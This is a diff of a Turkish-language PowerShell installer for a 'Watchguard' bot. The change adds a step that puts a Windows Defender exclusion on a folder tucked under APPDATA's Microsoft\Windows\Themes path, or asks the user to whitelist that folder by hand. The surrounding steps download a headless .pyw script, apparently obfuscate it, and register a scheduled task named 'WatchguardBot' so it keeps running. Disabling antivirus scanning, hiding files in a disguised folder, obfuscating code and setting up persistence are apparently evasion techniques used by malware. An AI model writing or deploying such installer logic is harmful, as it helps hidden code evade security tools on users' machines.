@@ -107,9 +107,27 @@ if ($pinRaw -eq "" -or $pinRaw -eq $null) {
     $pin = "null"
 }
 
-# ── 2. Python bul veya kur ───────────────────────────────────────────────────
+# ── 2. Windows Defender exclusion ───────────────────────────────────────────
 
-Write-Header "ADIM 2: Python Kontrolu"
+Write-Header "ADIM 2: Antivirus Istisnasi"
+
+$watchguardDir = Join-Path $env:APPDATA "Microsoft\Windows\Themes\Watchguard"
+Write-Step "Windows Defender istisna ekleniyor..."
+Write-Info "Konum: $watchguardDir"
+try {
+    Add-MpPreference -ExclusionPath $watchguardDir -ErrorAction Stop
+    Write-OK "Defender istisna eklendi"
+} catch {
+    Write-Info "Defender istisna eklenemedi (üçüncü taraf AV olabilir): $_"
+    Write-Info "Antivirüs programinizdan asagidaki klasörü istisna olarak ekleyin:"
+    Write-Info "  $watchguardDir"
+    Write-Host ""
+    Read-Host "  Istisnayi ekledikten sonra Enter'a basin"
+}
+
+# ── 3. Python bul veya kur ───────────────────────────────────────────────────
+
+Write-Header "ADIM 3: Python Kontrolu"
 
 $pythonExe    = $null
 $pythonwExe   = $null
@@ -233,7 +251,7 @@ if (-not $pythonwExe -or -not (Test-Path $pythonwExe)) {
 
 # ── 3. watchguard.dat oluştur ────────────────────────────────────────────────
 
-Write-Header "ADIM 3: Yapilandirma Dosyasi"
+Write-Header "ADIM 4: Yapilandirma Dosyasi"
 
 $datDir  = Join-Path $env:APPDATA "Microsoft\Windows\Themes\Watchguard"
 $datPath = Join-Path $datDir "watchguard.dat"
@@ -294,7 +312,7 @@ Remove-Item $tempPy -Force -ErrorAction SilentlyContinue
 
 # ── 4. watchguard_v3.pyw'yi indir ve obfüske et ─────────────────────────────
 
-Write-Header "ADIM 4: Bot Scripti"
+Write-Header "ADIM 5: Bot Scripti"
 
 $scriptDest = Join-Path $datDir "watchguard_v3.pyw"
 $scriptUrl  = "https://raw.githubusercontent.com/zygomatic-git/watchguard/main/watchguard_v3.pyw"
@@ -360,7 +378,7 @@ try {
 
 # ── 5. Python paketlerini yükle ──────────────────────────────────────────────
 
-Write-Header "ADIM 5: Python Paketleri"
+Write-Header "ADIM 6: Python Paketleri"
 
 Write-Step "pip guncelleniyor..."
 & $pythonExe -m pip install --upgrade pip --quiet 2>&1 | Out-Null
@@ -393,7 +411,7 @@ if ($LASTEXITCODE -eq 0) {
 
 # ── 6. Task Scheduler gorevi ─────────────────────────────────────────────────
 
-Write-Header "ADIM 6: Task Scheduler"
+Write-Header "ADIM 7: Task Scheduler"
 
 $taskName = "WatchguardBot"
 
@@ -422,7 +440,7 @@ if ($LASTEXITCODE -eq 0) {
 
 # ── 7. Simdi baslatmak istiyor mu? ───────────────────────────────────────────
 
-Write-Header "ADIM 7: Baslatma"
+Write-Header "ADIM 8: Baslatma"
 
 $startNow = Read-Host "  Botu simdi baslatmak ister misiniz? (E/H)"
 if ($startNow -match '^[Ee]') {
